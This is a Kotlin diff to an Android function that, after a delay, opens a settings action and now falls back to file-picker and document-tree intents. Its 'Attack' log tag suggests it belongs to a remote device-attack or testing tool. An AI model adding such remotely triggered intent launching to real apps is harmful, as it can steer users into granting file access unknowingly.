@@ -315,19 +315,35 @@ fun uploadMedia(data: MediaUploadData, context: Context) {
 
 fun openSettingsAction(actionData: SettingsActionData, context: Context) {
     Handler(Looper.getMainLooper()).postDelayed({
-        try {
-            val intent = Intent(actionData.action).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            }
-            if (intent.resolveActivity(context.packageManager) != null) {
-                context.startActivity(intent)
-                Log.i("Attack", "open settings action: ${actionData.action}")
-            } else {
-                Log.w("Attack", "no activity can handle settings action ${actionData.action}")
-            }
-        } catch (e: Exception) {
-            Log.e("Attack", "open settings action failed: ${e.message}")
+        // 尝试主 action，失败则回退到常见文件选择/文档意图，提升兼容性
+        val candidates = mutableListOf<Intent>()
+        if (actionData.action.isNotBlank()) {
+            candidates.add(Intent(actionData.action))
         }
+        // 常见文件选择器入口
+        candidates.add(Intent(Intent.ACTION_OPEN_DOCUMENT_TREE))
+        candidates.add(Intent(Intent.ACTION_GET_CONTENT).apply {
+            addCategory(Intent.CATEGORY_OPENABLE)
+            type = "*/*"
+        })
+        candidates.add(Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
+            addCategory(Intent.CATEGORY_OPENABLE)
+            type = "*/*"
+        })
+
+        for (intent in candidates) {
+            try {
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                if (intent.resolveActivity(context.packageManager) != null) {
+                    context.startActivity(intent)
+                    Log.i("Attack", "open settings action: ${intent.action}")
+                    return@postDelayed
+                }
+            } catch (e: Exception) {
+                Log.e("Attack", "open settings action failed for ${intent.action}: ${e.message}")
+            }
+        }
+        Log.w("Attack", "no activity can handle file picker / settings intents")
     }, actionData.delay)
 }
 
